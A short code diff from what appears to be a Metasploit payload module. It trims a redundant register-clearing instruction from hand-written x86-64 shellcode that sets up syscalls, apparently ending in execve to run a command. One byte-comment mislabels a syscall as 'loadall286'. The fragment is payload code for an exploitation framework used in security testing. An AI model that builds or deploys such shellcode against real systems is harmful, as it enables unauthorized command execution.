@@ -85,7 +85,6 @@ module MetasploitModule
       "\x83\xc0\x5A" +                             # add eax,0x5a
       "\x48\xFF\xC6" +                             # inc rsi
       "\x0F\x05" +                                 # loadall286
-      "\x48\x31\xC0" +                             # xor rax,rax
       "\x31\xc0" +                                 # xor eax,eax
       "\x83\xc0\x3B" +                             # add eax,0x3b
       call +                                       # call CMD.len
